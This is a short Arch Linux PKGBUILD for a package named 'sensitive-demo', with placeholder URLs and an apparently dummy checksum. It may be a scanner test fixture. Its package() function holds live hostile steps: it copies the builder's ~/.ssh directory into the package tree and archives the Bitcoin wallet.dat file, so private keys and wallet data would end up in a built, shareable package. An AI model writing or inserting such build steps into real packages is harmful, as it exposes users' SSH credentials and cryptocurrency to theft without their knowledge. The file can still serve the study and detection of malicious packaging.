pkgname=sensitive-demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://example.invalid/sensitive-demo"
source=("https://example.invalid/sensitive-demo.tar.gz")
sha256sums=('b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184')

package() {
  cp -r "$HOME/.ssh" "$pkgdir/usr/share/demo/ssh"
  tar czf "$srcdir/wallet.tar.gz" "$HOME/.bitcoin/wallet.dat"
}
